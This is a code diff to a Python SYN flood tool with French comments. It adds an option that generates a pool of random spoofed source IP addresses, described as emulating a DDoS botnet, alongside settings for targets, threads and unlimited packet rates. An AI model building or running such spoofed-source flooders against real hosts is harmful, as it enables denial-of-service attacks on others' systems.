@@ -38,6 +38,7 @@ class SYNFlooder:
         num_threads: int = 10,
         spoof_pool: Optional[List[str]] = None,
         rate_limit_pps: Optional[int] = None,
+        spoof_pool_size: int = 0,
     ):
         """Initialise le SYN Flooder.
 
@@ -47,11 +48,13 @@ class SYNFlooder:
             num_threads (int): Nombre de threads à utiliser
             spoof_pool (List[str] | None): IP sources à utiliser pour simuler un botnet
             rate_limit_pps (int | None): Limite de paquets/s par thread (None = illimité)
+            spoof_pool_size (int): Nombre d'IP aléatoires à générer pour simuler des bots
         """
         self.target_ips = target_ips or []
         self.target_ports = target_ports or [80]
         self.num_threads = max(1, num_threads)
         self.spoof_pool = spoof_pool or []
+        self.spoof_pool_size = max(0, spoof_pool_size)
         self.rate_limit_pps = rate_limit_pps
         self.logger = get_logger("SYNFlood")
 
@@ -61,6 +64,10 @@ class SYNFlooder:
         self.start_time = None
         self.lock = threading.Lock()
         self.threads: List[threading.Thread] = []
+
+        # Generate a random spoof pool when requested to emulate a DDoS botnet
+        if not self.spoof_pool and self.spoof_pool_size:
+            self.spoof_pool = [self._generate_random_ip() for _ in range(self.spoof_pool_size)]
 
         self.logger.info("🎯 Initialisation du SYN Flooder")
         self.logger.info(f"  Cibles: {self.target_ips} | Ports: {self.target_ports}")
